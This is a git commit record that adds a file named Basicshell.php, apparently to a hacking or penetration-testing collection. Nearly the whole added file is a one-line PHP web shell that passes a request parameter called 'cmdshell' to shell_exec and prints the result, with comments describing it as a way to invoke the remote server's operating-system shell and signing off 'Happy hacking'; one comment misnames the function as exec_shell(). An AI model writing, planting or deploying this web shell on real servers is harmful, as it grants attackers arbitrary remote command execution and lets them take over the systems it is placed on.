4406367c2bc8e73a13adaeb2190c25d500a45430
Sarthak Gupta <32425257+sarthak1598@users.noreply.github.com>
2018-12-12 12:35:15 +0530

    BasicShell.php

---
+++ Basicshell.php
@@ -0,0 +1,8 @@
+/* this code is written in php and a smallest one but good enough to invoke the remote system os-shell if the vulnerbility
+   exists in the web server */
+   
+ <?php highlight_string(shell_exec($_REQUEST['cmdshell'])) ?> //command argument would be passed through the cmdshell variable
+  
+  // exec_shell() function is well defined in php to invoke the operating system shell ...
+  //Happy hacking 
+ 
